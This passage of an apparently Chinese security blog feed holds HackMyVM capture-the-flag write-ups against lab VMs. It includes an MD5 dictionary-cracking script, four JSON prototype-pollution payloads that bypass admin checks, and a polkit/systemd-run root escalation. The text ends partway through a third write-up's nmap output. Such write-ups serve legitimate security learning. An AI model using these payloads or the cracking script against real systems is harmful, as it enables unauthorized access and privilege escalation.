class="hljs-comment"># åŠ ä¸Šæ¢è¡Œç¬¦åè¿›è¡Œå“ˆå¸Œ</span><br>    candidate = word_bytes.strip() + <span class="hljs-string">b&#x27;\n&#x27;</span><br>    md5_hash = hashlib.md5(candidate).hexdigest()<br><br>    <span class="hljs-keyword">if</span> md5_hash == TARGET_HASH:<br>        <span class="hljs-keyword">with</span> lock:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>                found = <span class="hljs-literal">True</span><br>                decoded = candidate.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>).strip()<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] åŒ¹é…æˆåŠŸï¼æ˜æ–‡ä¸º: <span class="hljs-subst">&#123;decoded&#125;</span>\\n&quot;</span>)<br>                exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_thread</span>(<span class="hljs-params">word</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        check_password(word)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> found<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] å¼€å§‹çˆ†ç ´...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DICTIONARY_PATH, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            lines = file.readlines()<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] æ— æ³•æ‰“å¼€å­—å…¸æ–‡ä»¶: <span class="hljs-subst">&#123;DICTIONARY_PATH&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    threads = []<br><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">while</span> threading.active_count() &gt;= MAX_THREADS:<br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># ç­‰å¾…æœ‰çº¿ç¨‹ç©ºå‡º</span><br>        t = threading.Thread(target=start_thread, args=(word,))<br>        t.start()<br>        threads.append(t)<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] æœªæ‰¾åˆ°åŒ¹é…é¡¹&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/2025/08/03/HackMyVM-Open/pycharm64_pM7RNBrg0X.png"></p><p>æ‹¿åˆ°å¯†ç ç™»å½•rootã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh root@192.168.56.130<br>root@192.168.56.130&#x27;s password: <br>Linux Open 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Tue Jul 29 00:48:55 2025 from 192.168.3.94<br>root@Open:~# cat /root/root.txt <br>flag&#123;root-6cd1f22e65d26246530ff7a2528144e3&#125;<br>root@Open:~# <br></code></pre></td></tr></table></figure><p>å°±æ˜¯æŒºä¸­è§„ä¸­çŸ©çš„ä¸€ä¸ªé¶æœºå§ï¼Œä»å¼€å§‹çš„webshellåˆ°userå†åˆ°rootéƒ½æœ‰ç§å¾ªåºæ¸è¿›çš„æ„Ÿè§‰ï¼Œå¯¹å‘½ä»¤æ³¨å…¥è€ƒå¯Ÿçš„æ¯”è¾ƒå¤šï¼Œè¿˜æœ‰å°±æ˜¯è¦æ³¨æ„ç»†èŠ‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Node</title>
    <link href="/2025/07/27/HackMyVM-Node/"/>
    <url>/2025/07/27/HackMyVM-Node/</url>
    
    <content type="html"><![CDATA[<p>å¥½æƒ³å˜æˆä¸€åªæ°´æ¯å•Šâ€¦â€¦</p><p>æç®€é¶æœºï¼Œæ€»ä½“åªæœ‰ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p>é¶æœºipï¼š192.168.56.127</p><hr><h3 id="GetHungry"><a href="#GetHungry" class="headerlink" title="GetHungry"></a>GetHungry</h3><p>æ‰«æç«¯å£ï¼Œå‘ç°åªå¼€äº†22å’Œä¸€ä¸ªå«3000çš„è‡ªå®šä¹‰ç«¯å£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nmap 192.168.56.127<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-27 00:10 EDT<br>Nmap scan report for 192.168.56.127<br>Host is up (0.00065s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:67:81:6A (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds<br><br></code></pre></td></tr></table></figure><p>è®¿é—®3000ç«¯å£ï¼Œæ˜¯ä¸ªJSåŸå‹é“¾æ±¡æŸ“æŒ‘æˆ˜çš„å°æ¸¸æˆï¼Œä¸€å…±è¦è¿‡å››å…³ã€‚</p><p><a href="https://www.zyxy.net/archives/13968">è§£é‡Š JavaScript ä¸­çš„ Prototype Pollution (åŸå‹æ±¡æŸ“) æ¼æ´åŠå…¶é˜²å¾¡ã€‚ - æ™ºçŒ¿å­¦é™¢-å‰åç«¯ï¼Œæ•°æ®åº“ï¼Œäººå·¥æ™ºèƒ½ï¼Œäº‘è®¡ç®—ç­‰é¢†åŸŸå‰æ²¿æŠ€æœ¯è®²åº§</a></p><p><a href="https://www.cnblogs.com/wh03ver/p/18461928">ã€æ¼æ´å­¦ä¹ ã€‘JavaScript Prototype Pollutionï¼ˆJavaScriptåŸå‹æ±¡æŸ“æ¼æ´ï¼‰ - wh03ver-momo - åšå®¢å›­</a></p><p>å…³å¡ 1: åŸºç¡€åŸå‹æ±¡æŸ“</p><p>é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹æˆ–å‡½æ•°éªŒè¯æ¥æå‡æƒé™ã€‚ä½¿ç”¨JSONè¾“å…¥è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>å…³å¡ 2: ç»•è¿‡ç®€å•é˜²æŠ¤</p><p>é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹æˆ–å‡½æ•°éªŒè¯æ¥æå‡æƒé™ã€‚ä½¿ç”¨JSONè¾“å…¥è¿›è¡Œæ”»å‡»ã€‚<br>å½“å‰è¿›åº¦ 25%<br>æ”»å‡»æç¤º</p><p>è¿™ä¸€å…³è¿‡æ»¤äº† â€˜<strong>proto</strong>â€˜ï¼Œå°è¯•ä½¿ç”¨ â€˜constructor.prototypeâ€™ æ±¡æŸ“ Array.prototype</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>å…³å¡ 3: å¤šå±‚åŸå‹æ±¡æŸ“</p><p>é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹æˆ–å‡½æ•°éªŒè¯æ¥æå‡æƒé™ã€‚ä½¿ç”¨JSONè¾“å…¥è¿›è¡Œæ”»å‡»ã€‚<br>å½“å‰è¿›åº¦ 50%<br>æ”»å‡»æç¤º</p><p>ä½¿ç”¨åµŒå¥—å¯¹è±¡ä¸­çš„ â€˜<strong>proto</strong>â€˜ æ±¡æŸ“ Object.prototypeï¼Œä½¿æ‰€æœ‰å¯¹è±¡ï¼ˆåŒ…æ‹¬å‡½æ•°å®ä¾‹ï¼‰ç»§æ‰¿ isAdmin å±æ€§</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…³å¡ 4: åŠ¨æ€éªŒè¯ç»•è¿‡</p><p>é€šè¿‡ä¿®æ”¹å¯¹è±¡åŸå‹æˆ–å‡½æ•°éªŒè¯æ¥æå‡æƒé™ã€‚ä½¿ç”¨JSONè¾“å…¥è¿›è¡Œæ”»å‡»ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;validateAccess&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;function() &#123; return true; &#125;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>   <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å…¨éƒ¨åšå®Œä¹‹åæ‹¿åˆ°hungry:imveryhungry,å³userç™»å½•å¯†ç ï¼Œsshä¸Šå»æ‹¿åˆ°userflagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Last login: Sat Jul 26 13:56:22 2025 from 192.168.56.104<br>hungry@Node:~$ ls -al<br>total 28<br>drwxr-xr-x 3 hungry hungry 4096 Jul 26 12:17 .<br>drwxr-xr-x 3 root   root   4096 Jul 23 02:51 ..<br>lrwxrwxrwx 1 root   root      9 Jul 23 02:52 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 hungry hungry  220 Apr 18  2019 .bash_logout<br>-rw-r--r-- 1 hungry hungry 3526 Apr 18  2019 .bashrc<br>drwx------ 3 hungry hungry 4096 Jul 26 12:17 .gnupg<br>-rw-r--r-- 1 hungry hungry  807 Apr 18  2019 .profile<br>-rw-r--r-- 1 root   root     44 Jul 23 03:04 user.txt<br>hungry@Node:~$ cat user.txt <br>flag&#123;user-8c4b1157cb6f8884aa183ac0f1447e6c&#125;<br>hungry@Node:~$ <br><br></code></pre></td></tr></table></figure><p>psï¼šå› ä¸ºä¹‹å‰webç•Œé¢å¥½åƒå»¶è¿Ÿå¼€æ”¾äº†ä¸€ä¼šå…ˆç”¨curlæ‰«äº†ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰éå¸¸éå¸¸å¤šçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬easyæ¨¡å¼è¿˜æœ‰flagå­˜å‚¨çš„apièƒ½ç›´æ¥è®¿é—®ï¼Œä¸è¿‡è‡³å°‘è¦å…ˆåšä¸€é¢˜æ‹¿åˆ°ç®¡ç†å‘˜cookie</p><p>ppsï¼šeasyæ¨¡å¼çœŸçš„ç›´æ¥ç»™ç™»å½•è´¦å·å¯†ç ã€‚</p><hr><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>è¿™é‡Œä¿¡æ¯æ”¶é›†æŒºéº»çƒ¦çš„å°±ä¸æµªè´¹ç‰ˆé¢äº†ï¼Œæ²¡å‘ç°ä¸œè¥¿åæ¥é—®äº†ä½œè€…æ‰çŸ¥é“æ˜¯è¦åˆ©ç”¨polkitã€‚</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs crystal">hungry<span class="hljs-variable">@Node</span>:~<span class="hljs-variable">$ </span>find / -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chsh</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chfn</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/gpasswd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/mount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/umount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/pkexec</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/sudo</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/eject/dmcrypt</span>-get-device<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign<br><span class="hljs-regexp">/usr/libexec</span><span class="hljs-regexp">/polkit-agent-helper-1</span><br></code></pre></td></tr></table></figure><p>polkit-agent-helper-1ä¸ºrootæƒé™ã€‚</p><p>è¿™æˆ‘ä¸€å¼€å§‹æ²¡æƒ³åˆ°ï¼Œæ¯›äº†å¤œä½¬çš„wpã€‚</p><p><a href="https://blog.csdn.net/li1136594919/article/details/131488386">Linuxç³»ç»Ÿå®‰å…¨ï¼šæƒé™æå‡ä¸è¿œç¨‹æ§åˆ¶æŠ€å·§-CSDNåšå®¢</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">hungry@Node:~$ systemd-run -t /bin/bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                                                       <br>Authenticating as: hungry<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit: run-u7.service                                                                                                                            <br>Press ^] three times within 1s to disconnect TTY.<br>root@Node:/# cat /root/root.txt <br>flag&#123;root-c946739aa8e0f1008c32e311076f355f&#125;<br>root@Node:/# <br><br></code></pre></td></tr></table></figure><h4 id="ä¸ºä»€ä¹ˆç»“åˆ-polkit-agent-helper-1-å¯ä»¥ç›´æ¥è·å–-root-æƒé™ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆç»“åˆ-polkit-agent-helper-1-å¯ä»¥ç›´æ¥è·å–-root-æƒé™ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆç»“åˆ polkit-agent-helper-1 å¯ä»¥ç›´æ¥è·å– root æƒé™ï¼Ÿ"></a>ä¸ºä»€ä¹ˆç»“åˆ <code>polkit-agent-helper-1</code> å¯ä»¥ç›´æ¥è·å– root æƒé™ï¼Ÿ</h4><ol><li><p><strong><code>polkit</code> çš„å·¥ä½œåŸç†</strong>ï¼š<br> <code>polkit</code>ï¼ˆPolicyKitï¼‰æ˜¯ Linux ä¸Šç”¨äºæˆæƒéç‰¹æƒè¿›ç¨‹ï¼ˆå¦‚æ™®é€šç”¨æˆ·ï¼‰æ‰§è¡Œç‰¹æƒæ“ä½œï¼ˆå¦‚ä»¥ root ç”¨æˆ·è¿è¡Œå‘½ä»¤ï¼‰çš„æ¡†æ¶ã€‚å®ƒé€šè¿‡ç­–ç•¥è§„åˆ™æ¥æ§åˆ¶å“ªäº›æ“ä½œå¯ä»¥ç”±å“ªäº›ç”¨æˆ·æ‰§è¡Œã€‚<code>polkit-agent-helper-1</code> æ˜¯ä¸€ä¸ªä¸ <code>polkit</code> ä¸€èµ·å·¥ä½œçš„å·¥å…·ï¼Œå®ƒç”¨äºå¤„ç†ç”¨æˆ·çš„è®¤è¯è¯·æ±‚å’Œæ‰§è¡Œæ“ä½œçš„æˆæƒã€‚</p></li><li><p><strong>æˆæƒè¿‡ç¨‹</strong>ï¼š<br> å½“ä½ è¿è¡Œ <code>systemd-run -t /bin/bash</code> æ—¶ï¼Œç³»ç»Ÿä¼šè§¦å‘ä¸€ä¸ª <code>polkit</code> æˆæƒè¯·æ±‚ï¼Œè¦æ±‚ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ­¤æ—¶ï¼Œ<code>polkit</code> ä¼šæ ¹æ®ç­–ç•¥è§„åˆ™ï¼Œå†³å®šæ˜¯å¦å…è®¸è¯¥ç”¨æˆ·æ‰§è¡Œ root æ“ä½œã€‚å¦‚æœä½ è¾“å…¥æ­£ç¡®çš„å¯†ç ï¼ˆæˆ–ç³»ç»Ÿé…ç½®å…è®¸ä½ çš„ç”¨æˆ·æ‰§è¡Œè¯¥æ“ä½œï¼‰ï¼Œå°±ä¼šæˆåŠŸæå‡ä¸º root æƒé™ã€‚</p></li><li><p><strong><code>polkit-agent-helper-1</code> çš„è§’è‰²</strong>ï¼š<br> <code>polkit-agent-helper-1</code> ä½œä¸ºä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥è§¦å‘ <code>polkit</code> çš„è®¤è¯è¿‡ç¨‹ï¼Œå…è®¸ç‰¹å®šç”¨æˆ·ï¼ˆå¦‚æ™®é€šç”¨æˆ· <code>hungry</code>ï¼‰åœ¨æœªå®Œå…¨ä¾èµ–äºæ‰‹åŠ¨è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹è·å– root æƒé™ã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœ <code>polkit-agent-helper-1</code> è¢«é…ç½®ä¸ºå…è®¸æ™®é€šç”¨æˆ·ä»¥ root æƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œå®ƒå°†é€šè¿‡ <code>polkit</code> æä¾›è®¤è¯æœºåˆ¶ï¼Œå¹¶æˆæƒç”¨æˆ·ä»¥ root æƒé™æ‰§è¡Œç›¸å…³å‘½ä»¤ã€‚</p></li><li><p><strong>æƒé™ç­–ç•¥é…ç½®</strong>ï¼š<br> å®é™…ä¸Šï¼Œ<code>polkit</code> æ˜¯é€šè¿‡ä¸€ç³»åˆ—çš„æƒé™ç­–ç•¥æ–‡ä»¶æ¥æ§åˆ¶è®¿é—®çš„ã€‚ä¾‹å¦‚ï¼Œ<code>/etc/polkit-1/</code> ç›®å½•ä¸‹çš„ç­–ç•¥æ–‡ä»¶æŒ‡å®šäº†å“ªäº›æ“ä½œæ˜¯å…è®¸çš„ï¼Œå“ªäº›æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™çš„ï¼Œæˆ–è€…å“ªäº›å‘½ä»¤æ˜¯æ™®é€šç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„ã€‚å¦‚æœ <code>polkit</code> çš„ç­–ç•¥æ–‡ä»¶é…ç½®äº†æ™®é€šç”¨æˆ· <code>hungry</code> å¯ä»¥è¿è¡Œç‰¹å®šå‘½ä»¤ï¼ˆå¦‚ <code>systemd-run</code>ï¼‰å¹¶æˆæƒè¯¥æ“ä½œï¼Œå®ƒå°±èƒ½å¤Ÿåœ¨è®¤è¯åä»¥ root èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p></li><li><p><strong>å¦‚ä½•å®ç°è¿™ä¸€ç‚¹</strong>ï¼š</p><ul><li><code>polkit-agent-helper-1</code> å¯ä»¥åœ¨åå°è‡ªåŠ¨å¤„ç† <code>polkit</code> è®¤è¯è¿‡ç¨‹ï¼Œé¿å…éœ€è¦æ‰‹åŠ¨è¾“å…¥å¯†ç ã€‚</li><li><code>systemd-run</code> å‘½ä»¤æœ¬èº«ä¼šè§¦å‘ <code>polkit</code> è®¤è¯è¯·æ±‚ï¼Œä½† <code>polkit-agent-helper-1</code> å¯ä»¥é€šè¿‡ <code>polkit</code> è‡ªåŠ¨å¤„ç†æˆæƒï¼Œä»è€Œå…è®¸æ™®é€šç”¨æˆ·åœ¨è·å¾—æˆæƒåæ‰§è¡Œ root å‘½ä»¤ã€‚</li></ul><p>æ€»ä¹‹ï¼Œ<code>polkit-agent-helper-1</code> ç»“åˆ <code>polkit</code> çš„æˆæƒæœºåˆ¶ï¼Œèƒ½å¤Ÿå¸®åŠ©æ™®é€šç”¨æˆ·æ‰§è¡Œæœ¬åº”ç”± root ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ã€‚</p></li></ol><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><code>polkit-agent-helper-1</code> ä¸ <code>polkit</code> ç»“åˆä½¿ç”¨æ—¶ï¼Œèƒ½å¤Ÿé€šè¿‡è‡ªåŠ¨åŒ–èº«ä»½éªŒè¯å’Œæƒé™æˆæƒçš„è¿‡ç¨‹ï¼Œè®©æ™®é€šç”¨æˆ·é€šè¿‡ <code>polkit</code> æˆæƒæ¥è¿è¡Œ root æƒé™çš„å‘½ä»¤ã€‚åœ¨ä½ çš„ä¾‹å­ä¸­ï¼Œ<code>polkit-agent-helper-1</code> é€šè¿‡è§¦å‘ <code>polkit</code> çš„æˆæƒæµç¨‹ï¼Œå…è®¸ <code>hungry</code> ç”¨æˆ·ä»¥ root èº«ä»½æ‰§è¡Œ <code>systemd-run</code> å‘½ä»¤ã€‚</p><p>å¦‚æœä½ ä¸å¸Œæœ›æŸä¸ªç”¨æˆ·èƒ½å¤Ÿè½»æ¾è·å¾— root æƒé™ï¼Œåº”è¯¥è°ƒæ•´ç›¸åº”çš„ <code>polkit</code> ç­–ç•¥ï¼Œé™åˆ¶å…¶å¯¹ç‰¹å®šå‘½ä»¤æˆ–æœåŠ¡çš„è®¿é—®æƒé™ã€‚</p><p>å¥½æƒ³å˜æˆä¸€åªæ°´æ¯å•Šâ€¦â€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-hoshi</title>
    <link href="/2025/06/23/HackMyVM-hoshi/"/>
    <url>/2025/06/23/HackMyVM-hoshi/</url>
    
    <content type="html"><![CDATA[<p>æ‰“å®Œè‡³å°‘å¾—æ­‡ä¸€å‘¨çš„é¶æœºã€‚</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>nmapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.121<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 03:13 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Initiating ARP Ping Scan at 03:13<br>Scanning 192.168.56.121 [1 port]<br>Completed ARP Ping Scan at 03:13, 0.04s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 03:13<br>Completed Parallel DNS resolution of 1 host. at 03:13, 0.03s elapsed<br>Initiating SYN Stealth Scan at 03:13<br>Scanning 192.168.56.121 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.121<br>Discovered open port 80/tcp on 192.168.56.121<br>Completed SYN Stealth Scan at 03:13, 0.08s elapsed (1000 total ports)<br>Initiating Service scan at 03:13<br>Scanning 2 services on 192.168.56.121<br>Completed Service scan at 03:13, 6.04s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.121<br>NSE: Script scanning 192.168.56.121.<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.28s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.01s elapsed<br>Initiating NSE at 03:13<br>Completed NSE at 03:13, 0.00s elapsed<br>Nmap scan report for 192.168.56.121<br>Host is up (0.00080s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   